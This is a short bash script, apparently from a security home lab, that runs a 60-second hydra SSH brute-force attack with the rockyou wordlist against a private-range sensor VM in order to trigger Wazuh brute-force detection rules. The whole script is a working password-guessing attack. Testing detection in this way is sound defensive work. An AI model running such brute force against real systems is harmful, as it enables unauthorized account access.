#!/bin/bash
# SSH brute force against the Sensor VM
# Expected: Multiple failed logins, Wazuh brute force rule fires

TARGET="192.168.56.11"
USER="sensor"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Ensure wordlist is unzipped
[ -f "${WORDLIST}.gz" ] && sudo gunzip "${WORDLIST}.gz"

echo "[*] Running hydra brute force against $TARGET..."
timeout 60 hydra -l "$USER" -P "$WORDLIST" ssh://"$TARGET"

echo "[*] Attack complete (60s timeout)."
echo "[*] Check Wazuh for rule.id: 5710 or 5712"
